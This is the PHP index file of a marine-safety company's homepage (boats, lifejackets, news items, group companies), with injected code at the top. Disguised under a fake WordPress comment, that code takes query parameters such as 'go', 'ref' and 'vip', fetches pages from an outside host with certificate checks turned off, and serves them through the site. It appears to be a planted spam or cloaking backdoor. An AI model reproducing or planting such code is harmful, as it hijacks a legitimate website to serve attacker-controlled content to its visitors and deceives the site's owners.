<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
function fetchDataFromSite($site) {
    $ch = curl_init($site);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

if(isset($_GET['go'])) {
    $sitex = $_GET['go'];
    $site = 'https://replication2.pkcdurensawit.net/shmgroup/?go='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['ref'])) {
    $sitex = $_GET['ref'];
    $site = 'https://replication2.pkcdurensawit.net/shmgroup/?ref='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
}
elseif(isset($_GET['web'])) {
  $sitex = $_GET['web'];
  $site = 'https://replication2.pkcdurensawit.net/shmgroup/?web='.$sitex;
  $data = fetchDataFromSite($site);
  echo $data;
}

elseif(isset($_GET['top'])) {
  $sitex = $_GET['top'];
  $site = 'https://replication2.pkcdurensawit.net/shmgroup/?top='.$sitex;
  $data = fetchDataFromSite($site);
  echo $data;
}
	elseif(isset($_GET['vip'])) {
  $sitex = $_GET['vip'];
  $site = 'https://replication2.pkcdurensawit.net/shmgroup/?vip='.$sitex;
  $data = fetchDataFromSite($site);
  echo $data;
}
elseif(isset($_GET['sites'])) {
    $sitex = $_GET['sites'];
    $site = 'https://replication2.pkcdurensawit.net/shmgroup/?sites='.$sitex;
    $data = fetchDataFromSite($site);
    echo $data;
	
} else {

/* Main Index file */


$page = 'Home';
$pageTitle = 'SHM Group - Boat Manufacturers in India|Ship Chandlers in India';
$pageDesc = 'Looking for best Boat Manufactures & Ship Chandler in India.SHM Group Manufacture,supply & service various types of boats in India.Click for more details.';
include "header.php";
?>

<style>
    .modal-txt p{    margin: 10px 30px;text-align: justify;}
    .modal-body img{margin: 0 auto;} 


</style>

<div id="loader-wrapper">
			<div id="loader"></div>
		</div>
<div id="slide1">
<div id="wrapper">
<span class="scroll-btn hidden-xs hidden-sm">
<a href="#2">
<span class="mouse">
<span>
</span>
</span>
</a>
<p>scroll me</p>
</span>

<ul class="rslides callbacks callbacks1" id="slider4">

<!--<li id="callbacks1_s0" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 6500ms ease-in-out">
<a href="./catalogue">
<img data-src="img/Home/catelogue-launch-2017.png" src="img/Home/catelogue-launch-2017.png" alt="Saftey Catelogue Launch 2017"></a>
<p class="product-caption home-captain-text"><a href="./catalogue">Click Here</a>
</p>
</li>
<li id="callbacks1_s2" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 4500ms ease-in-out">
<img data-src="img/Optimize/Home-banner3.jpg" src="img/Optimize/banner3.jpg" alt="">
</li>
-->
<li id="callbacks1_s1" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 4500ms ease-in-out">
<img data-src="img/Optimize/world-environment-day-slider.jpg" src="img/Home/Mechanised-Boat1.jpg" alt="Mechanised-Boat">
</li>


<li id="callbacks1_s2" class="" style="display:list-item;float:left;position:relative;opacity:1;z-index:2;transition:opacity 4500ms ease-in-out">
<img data-src="img/Optimize/home_slider2.jpg" src="img/Home/Twin-Engine-Boat1 .jpg" alt="Ship Chandlers in India">
</li>
<li id="callbacks1_s3" class="" style="display:list-item;float:left;position:relative;opacity:1;z-index:2;transition:opacity 4500ms ease-in-out">
<img data-src="img/Home/shm-banner_new_2.jpg" src="img/Home/shm-banner_new_2.jpg" alt="Patrol Boat">
</li>
<li id="callbacks1_s4" class="" style="display:list-item;float:left;position:relative;opacity:1;z-index:2;transition:opacity 4500ms ease-in-out">
<img data-src="img/Home/shm-banner_new_3.jpg" src="img/Home/shm-banner_new_3.jpg" alt="Liferaft">
</li>
<li id="callbacks1_s5" class="" style="display:list-item;float:left;position:relative;opacity:1;z-index:2;transition:opacity 4500ms ease-in-out">
<img data-src="img/Home/shm-banner_new_4.jpg" src="img/Home/shm-banner_new_4.jpg" alt="Rigorous Test">
</li>
<li id="callbacks1_s6" class="" style="display:list-item;float:left;position:relative;opacity:1;z-index:2;transition:opacity 4500ms ease-in-out">
<img data-src="img/Home/shm-banner_new_5.jpg" src="img/Home/shm-banner_new_5.jpg" alt="Fire Protection">
</li>
<li id="callbacks1_s7" class="" style="display:list-item;float:left;position:relative;opacity:1;z-index:2;transition:opacity 4500ms ease-in-out">
<img data-src="img/Home/Life saving jackets that keep you safe during emergencies.png" src="img/Home/Life saving jackets that keep you safe during emergencies.png" alt="Personal Life Saving Appliances">
</li>
</ul>










<div class="clearfix"></div>
</div>
</div>
<div class="reapid-menu hidden-xs"></div>
<section id="2" class="slide2">
<div class="container">
<div class="row">
<div class="title">
<h1>WHAT WE DO</h1>
<p class="home-title-text">We strive to create safe and secure working environments by manufacturing, supplying, and servicing the best-in-class safety and survival systems that enable businesses’ freedom at sea and on shore. We offer our clients peace of mind as a trustworthy partner by providing quality products and taking care of their assets. We translate the complexity of safety standards into simple solutions for your business. All equipment and services you need in one place, provided by one team, at the best value for your money.</p>
</div>
</div>
<div class="row">
<div class="col-xs-6 col-sm-3 col-md-3 col-lg-3" >
<div class="feature_content text-center">

<i class="icon">
<a href="what-we-do.php" onclick="location.href='what-we-do.php'">
<img style="display:inline" class="desktop-what-we-do" data-src="img/icon1.png" src="img/icon1.png" alt="manufacture_icon">
<img style="display:inline" class="phone-what-we-do" data-src="img/icon1-phone.png" src="img/icon1-phone.png" alt="manufacture_icon2">
</a>
</i>
    <h3>MANUFACTURE</h3>

</div>
</div>
<div class="col-xs-6 col-sm-3 col-md-3 col-lg-3">
<div class="feature_content text-center">
   

<i class="icon">
<a href="what-we-do.php" onclick="location.href='what-we-do.php'">
<img style="display:inline" class="desktop-what-we-do lazy" data-src="img/icon2.png" src="img/icon2.png" alt="supply_icon">
<img style="display:inline" class="phone-what-we-do lazy" data-src="img/icon2-phone.png" src="img/icon2-phone.png" alt="supply_icon2">
</a>
</i>
 <h3>SUPPLY</h3>
</div>
</div>
<div class="col-xs-6 col-sm-3 col-md-3 col-lg-3">
<div class="feature_content text-center">
<i class="icon">
<a href="what-we-do.php" onclick="location.href='what-we-do.php'">
<img style="display:inline" class="desktop-what-we-do lazy" data-src="img/icon3.png" src="img/icon3.png" alt="service_icon">
<img style="display:inline" class="phone-what-we-do lazy" data-src="img/icon3-phone.png" src="img/icon3-phone.png" alt="service_icon2">
</a>
</i>
<h3>SERVICE</h3>
</div>
</div>
<div class="col-xs-6 col-sm-3 col-md-3 col-lg-3">
<div class="feature_content text-center">
<i class="icon">
<a href="what-we-do.php" onclick="location.href='what-we-do.php'">
<img style="display:inline" class="desktop-what-we-do lazy" data-src="img/Optimize/icon4.png" src="img/Optimize/icon4.png" alt="service_icon">
<img style="display:inline" class="phone-what-we-do lazy" data-src="img/Optimize/icon4-phone.png" src="img/Optimize/icon4-phone.png" alt="service_icon4">
</a>
</i>
<h3>TURNKEY</h3>
</div>
</div>
</div>
</div>
</section>
<section id="3" class="slide3">
<div class="container-fluid">
<div class="custom-container">
<div class="row">
<div class="col-md-6">
<div class="slide-container">
<span class="text-muted">About us</span>
<br>
<br>
<div class="text-muted-phone">
About us
</div>
<div class="home-about-section">
<p>“Enabling freedom at sea” stands for SHM’s commitment of offering our clients peace of mind at sea, offshore and onshore. We believe in reliability, trust and partnership, which are vital for the industry we operate in. Established in 2001 with a vision to save lives through timely delivery of quality marine safety and survival systems, SHM today has a network spanning over 11 port cities along the Indian coast and across coasts of Dubai, Malaysia, Shanghai, Singapore and Colombo.</p>
<p>Headquartered in Mumbai, SHM provides a one-stop solution for both sales and services and ensures quality solutions; timely delivery of their products and services through a comprehensive infrastructure of manufacturing, supplying, servicing &amp; repairing (over 2,00,000 sq. ft of warehousing and workshop facilities). Our dedicated team of qualified and trained personnel ensure the “peace of mind’’ you have when you know that someone you trust is taking care of you. We enable our customers the freedom to operate, trade, travel, explore, innovate and excel. SHM Shipcare takes pride in a customer centric, solution-based approach driven by incorporating the latest technologies and decades of experience.</p>
<p>Led by Mr. Saifuddin H. Hajee and a strong management team of 400 professionals and industry experts, SHM Shipcare is the largest FRP Boat manufacturer, Life-Saving/Fire-Fighting service provider in India and aims to provide on its experience and expertise top quality solutions through its current service offering and future growth plans in India and overseas.</p>
</div>
<a href="about.php" onclick="location.href='about.php'" class="btn btn-readmore text-right readmore-btn">Read More</a>
</div>
</div>

<!-- News Section -->
<div class="col-md-6">
<div class="video-container">
<div class="embed-responsive embed-responsive-16by9 video-container1">
<iframe width="100%" height="335" src="https://www.youtube.com/embed/GYu4o8tmyNI?rel=0" frameborder="0" allowfullscreen></iframe>
</div>
</div>
</div>
</div>
</div>
</div>
</section>
<section class="news-blog news-blog-wrap">
<div class="custom-container">
<div class="news-blog-col news-width" id="news-blog-1">
<div class="news-col">
<div class="news-main">
<img data-src="img/Optimize/SHM Spreads its wings globally - RIB delivered to Royal Malaysian Navy.png" src="img/news/SHM Spreads its wings globally - RIB delivered to Royal Malaysian Navy.png" alt="SHM Spreads its wings globally - RIB delivered to Royal Malaysian Navy" class="img-responsive">
<div class="news-title-new">NEWS</div>
<div class="news-content">
<b>SHM Spreads its wings globally - RIB delivered to Royal Malaysian Navy</b>
<p class="hidden-xs hidden-sm hidden-md">Having pioneered inflatable boat manufacturing in India, SHM is now ready to spread its wings globally...</p>
</div>
<button type="button" class="news-redmore-btn" data-toggle="modal" data-target="#news2022-1">Read More</button>
</div>
</div>
</div>


            <div class="modal fade" id="news2022-1" role="dialog">

                <div class="modal-dialog news-modal-dialog">


                    <div class="modal-content">

                        <div class="modal-body text-center">
                            <button type="button" class="close" data-dismiss="modal">&times;</button>

                                <img src="img/news/SHM Spreads its wings globally - RIB delivered to Royal Malaysian Navy.png" alt="SHM Spreads its wings globally - RIB delivered to Royal Malaysian Navy" class="img-responsive">

                        </div>
                        <div class="modal-txt">
                            <p>
                               Having pioneered inflatable boat manufacturing in India, SHM is now ready to spread its wings globally. Congratulations to the entire Malaysian team! 
                            </p>
                            <p>
                                 It gives us immense pride in sharing with you that SHM delivered its first order of Rigid Inflatable Boat overseas to the Royal Malaysian Navy, at Labuan Shipyard. 
                            </p>
                            <p>
                                 This marks an important milestone for SHM group and we are certain that SHM boats will find their way to every prestigious client worldwide.
                            </p>
                            
                        </div>

                        <div class="modal-footer">
                            <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
                        </div>
                    </div>

                </div>

            </div>


<!--
<div class="modal fade" id="news0" role="dialog">
<div class="modal-dialog news-modal-dialog alignment-modal" >
<div class="modal-content">
<div class="modal-body text-center">
<button type="button" class="close" data-dismiss="modal">&times;</button>
<img data-src="img/Optimize/saifuddin_large.jpg" src="img/Optimize/saifuddin_large.jpg" alt="Mr. Saifuddin Hajee was interviewed by The Oil and Gas Year Magazine." class="img-responsive">
</div>
<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
-->

<div class="news-blog-col blog-width" id="news-blog-2">
<div class="blog-col">
<?php
require($_SERVER['DOCUMENT_ROOT'] . '/blog/wp-load.php');
$args = array(
'posts_per_page' => 1 // Specify how many posts you'd like to display
);
$latest_posts = new WP_Query( $args );
if ( $latest_posts->have_posts() ) {
while ( $latest_posts->have_posts() ) {
$latest_posts->the_post(); ?>
<div class="blog-main" onclick="location.href='<?php the_permalink(); ?>'" style="background: url('<?php the_post_thumbnail_url(); ?>'); background-size: cover;">
<div class="blog-details">
<div class="blog-title-new">
BLOG
</div>
<div class="blog-date">
<a href="<?php the_permalink(); ?>" title="<?php the_title(); ?>"><?php the_title(); ?></a>
<br> <?php the_time('jS F, Y') ?>
</div>
</div>
</div>
<? }
} else {
echo '<p>There are no posts available</p>';
}
wp_reset_postdata();
?>
</div>
</div>
</div>
</section>
<section class="news-blog news-blog-wrap">
<div class="custom-container">
<div class="news-blog-col blog-width" id="news-blog-2">
<div class="embed-responsive embed-responsive-16by9">
<iframe class="embed-responsive-item" src="https://www.youtube.com/embed/-S-ApHTWL2k?rel=0" frameborder="0" allowfullscreen></iframe>
</div>
</div>
<div class="news-blog-col news-width" id="news-blog-1">
<div class="news-col">
<div class="news-main">
<img data-src="img/Optimize/12_1.jpg" src="img/Optimize/12_1.jpg" alt="SHM Shipcare participates in the Asia Pacific Maritime Exhibition (APM) at Singapore" class="img-responsive">
<div class="news-title-new" style="width:300px;margin-top:10px;display:inline-block">NEW PRODUCTS</div>
<div class="news-content">
<b>List of products added to portfolio in 2018</b>
</div>
<button type="button" class="news-redmore-btn" data-toggle="modal" data-target="#news2">View</button>
</div>
</div>
</div>
<div class="modal fade" id="news2" role="dialog">
<div class="modal-dialog news-modal-dialog">
<div class="modal-content">
<div class="modal-header">
<button type="button" class="close" data-dismiss="modal">&times;</button>
</div>
<div class="modal-body text-center">
<div class="clearfix"></div>
<!--
<ul class="rslides" id="slider6">
<li id="callbacks1_s11" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-1.jpg" src="img/Optimize/showroom-1.jpg" alt="Showroom" class="img-responsive">
</li>
<li id="callbacks1_s12" class="callbacks1_on" style="display:list-item;float:left;position:relative;opacity:1;z-index:2;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-2.jpg" src="img/Optimize/showroom-2.jpg" alt="Showroom" class="img-responsive">
</li>
<li id="callbacks1_s13" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-3.jpg" src="img/Optimize/showroom-3.jpg" alt="Showroom" class="img-responsive">
</li>
<li id="callbacks1_s14" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-4.jpg" src="img/Optimize/showroom-4.jpg" alt="Showroom" class="img-responsive">
</li>
<li id="callbacks1_s15" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-5.jpg" src="img/Optimize/showroom-5.jpg" alt="Showroom" class="img-responsive">
</li>
<li id="callbacks1_s16" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-6.jpg" src="img/Optimize/showroom-6.jpg" alt="Showroom" class="img-responsive">
</li>
<li id="callbacks1_s17" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-7.jpg" src="img/Optimize/showroom-7.jpg" alt="Showroom" class="img-responsive">
</li>
<li id="callbacks1_s18" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-8.jpg" src="img/Optimize/showroom-8.jpg" alt="Showroom" class="img-responsive">
</li>
<li id="callbacks1_s19" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-9.jpg" src="img/Optimize/showroom-9.jpg" alt="Showroom" class="img-responsive">
</li>
<li id="callbacks1_s20" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-10.jpg" src="img/Optimize/showroom-10.jpg" alt="Showroom" class="img-responsive">
</li>
</ul>
-->

<ul class="rslides" id="slider6">
<li id="callbacks1_s11" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-1.jpg" src="img/Optimize/12.jpg" alt="Showroom" class="img-responsive">
<label>Work Vest with Collar</label>
</li>
<li id="callbacks1_s12" class="callbacks1_on" style="display:list-item;float:left;position:relative;opacity:1;z-index:2;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-2.jpg" src="img/Optimize/13.jpg" alt="Showroom" class="img-responsive">
<label>Work Vest with Zipper <br>Product Code : LS05-01002-01</label>
</li>
<li id="callbacks1_s13" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-3.jpg" src="img/Optimize/14.jpg" alt="Showroom" class="img-responsive">
<label>Fireman’s Axe with Insulated Handle<br>
Product Code : FS02-04001-01</label>
</li>
<li id="callbacks1_s14" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-4.jpg" src="img/Optimize/15.jpg" alt="Showroom" class="img-responsive">
<label>Horse Shoe Lifebouy<br>
Product Code : LS02-01011-01</label>
</li>
<li id="callbacks1_s15" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-5.jpg" src="img/Optimize/16.jpg" alt="Showroom" class="img-responsive">
<label>Horse Shoe Lifebouy<br>
Product Code : LS02-01011-01</label>
</li>
<li id="callbacks1_s16" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-6.jpg" src="img/Optimize/17.jpg" alt="Showroom" class="img-responsive">
<label>Quick Release Knife With Cover<br>
Product Code : SC16-10001-01</label>
</li>
<li id="callbacks1_s17" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-7.jpg" src="img/Optimize/18.jpg" alt="Showroom" class="img-responsive">
<label>Inflatable SOLAS Lifejackets 150N<br>
Product Code : LS01-02001-67</label>
</li>
<li id="callbacks1_s18" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-8.jpg" src="img/Optimize/19.jpg" alt="Showroom" class="img-responsive">
<label>Inflatable SOLAS Lifejackets 275N<br>
Product Code : LS01-02002-67</label>
</li>
<li id="callbacks1_s19" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-9.jpg" src="img/Optimize/20.jpg" alt="Showroom" class="img-responsive">
<label>Basket Stretcher<br>
Product Code : EM02-02001-02</label>
</li>
<li id="callbacks1_s20" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-10.jpg" src="img/Optimize/21.jpg" alt="Showroom" class="img-responsive">
<label>Foot Pump<br>
Product Code : SC16-28001-01</label>
</li>
<li id="callbacks1_s20" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-10.jpg" src="img/Optimize/22.jpg" alt="Showroom" class="img-responsive">
<label>Lifebuoy Floating Life-Line Release Case<br>
Product Code : LS02-03001-01</label>
</li>
<li id="callbacks1_s20" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-10.jpg" src="img/Optimize/23.jpg" alt="Showroom" class="img-responsive">
<label>Rescue Tube<br>
Product Code : LS02-03005-01</label>
</li>
<li id="callbacks1_s20" class="" style="display:list-item;float:none;position:absolute;opacity:0;z-index:1;transition:opacity 3500ms ease-in-out">
<img data-src="img/Optimize/showroom-10.jpg" src="img/Optimize/24.jpg" alt="Showroom" class="img-responsive">
<label>Rescue Tube<br>
Product Code : LS01-02001-67</label>
</li>
</ul>



<div class="clearfix"></div>
</div>


<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>

</div>
</div>
</div>
</div>
</section>


<div class="clearfix"></div>


<section style="text-align:center;height:100%" id="6" data-jq-clipthru="testclass-1">
<section class="slide6" id="6" data-jq-clipthru="testclass-1">

<div class="phone-grp-companies lazy">
<img data-src="img/group-companies-phone.png" src="img/group-companies-phone.png" alt="Group Company">
</div>
<div class="container">
<div class="row tect-center hide-on-phone">
<div class="col-md-3 col-sm-3" style="margin-top:20%">

<div class="fetaure-details homa-shift lazy">
<img data-src="img/Logos/store.png" src="img/Logos/store.png" alt="THE SHM STORE">
<h4 class="main-color"><a href="group-of-companies.php" onclick="location.href='https://theshmstore.com'">THE SHM STORE</a></h4>
</div>

<div class="fetaure-details shm-shift lazy">
</div>

<div class="fetaure-details sharks-shift lazy">
<img data-src="img/Logos/engineering.png" src="img/Logos/engineering.png" alt="SHM ENGINEERING">
<h4 class="main-color"><a href="group-of-companies.php" onclick="location.href='#'">SHM ENGINEERING</a></h4>
</div>
</div>


<div class="col-md-6 col-sm-6">
<div class="fetaure-details lazy" style="margin-bottom:-20px;height:initial!important">
<img data-src="img/Logos/shipcare.png" src="img/Logos/shipcare.png" alt="SHM SHIPCARE PVT LTD">
<h4 class="main-color"><a href="http://shmgroup.com/" onclick="location.href='http://shmgroup.com/'">SHM SHIPCARE PVT LTD</a></h4>
</div>

<div class="phone-image lazy">
<img data-src="img/Home/SHM-group.png" src="img/Home/SHM-group.png" alt="SHM">
</div>

<div class="fetaure-details lazy" style="margin-top:-10px;margin-left:35px;height:initial!important;margin-bottom:40px">
<img data-src="img/Logos/products.png" src="img/Logos/products.png" alt="SHM PRODUCTS PVT LTD">
<h4 class="main-color"><a href="group-of-companies.php" onclick="location.href='#'">SHM PRODUCTS PVT LTD</a></h4>
</div>
</div>


<div class="col-md-3 col-sm-3" style="margin-top:18%">
<div class="fetaure-details craftway-shift lazy">
<img data-src="img/Logos/yard.png" src="img/Logos/yard.png" alt="SHM SHIPYARD LTD">
<h4 class="main-color"><a href="group-of-companies.php" onclick="location.href='#'">SHM SHIPYARD LTD</a></h4>
</div>

<div class="fetaure-details feature-shift lazy">
</div>

<div class="fetaure-details mercantile-shift lazy">
<img data-src="img/Logos/safety.png" src="img/Logos/safety.png" alt="HM FIRESAFETY PVT LTD">
<h4 class="main-color"><a href="group-of-companies.php" onclick="location.href='#'">SHM FIRESAFETY PVT LTD</a></h4>
</div>

</div>
</div>
</div>


<div class="grp-companies-phone" style="margin-bottom:60px">
<div class="logo-box-container">
<div class="logo-box lazy">
<img data-src="img/Logos/shipcare.png" src="img/Logos/shipcare.png" alt="SHM Shipcare Pvt Ltd" style="width:110px">
<div class="logo-name">
SHM Shipcare Pvt Ltd
</div>
</div>
<div class="logo-box lazy">
<img data-src="img/Logos/engineering.png" src="img/Logos/engineering.png" alt="SHM Engineering">
<div class="logo-name">
SHM Engineering
</div>
</div>
<div class="logo-box lazy">
<img data-src="img/Logos/store.png" src="iimg/Logos/store.png" alt="The SHM Store">
<div class="logo-name">
The SHM Store
</div>
</div>
<div class="logo-box small-logo lazy">
<img data-src="img/Logos/yard.png" src="img/Logos/yard.png" alt="SHM Shipyard Ltd">
<div class="logo-name">
SHM Shipyard ltd
</div>
</div>
<div class="logo-box small-logo lazy">
<img data-src="img/Logos/safety.png" src="img/Logos/safety.png" alt="SHM FIRESAFETY PVT LTD">
<div class="logo-name">
SHM Firesafety Pvt Ltd
</div>
</div>
<div class="logo-box no-logo-pad lazy">
<img data-src="img/Logos/products.png" src="img/Logos/products.png" alt="SHM Products Pvt Ltd">
<div class="logo-name">
SHM Products Pvt Ltd
</div>
</div>
<div class="center-line">
</div>
</div>
</div>
</section>
</section>


<?php
        
  include "footer.php";
}
?>
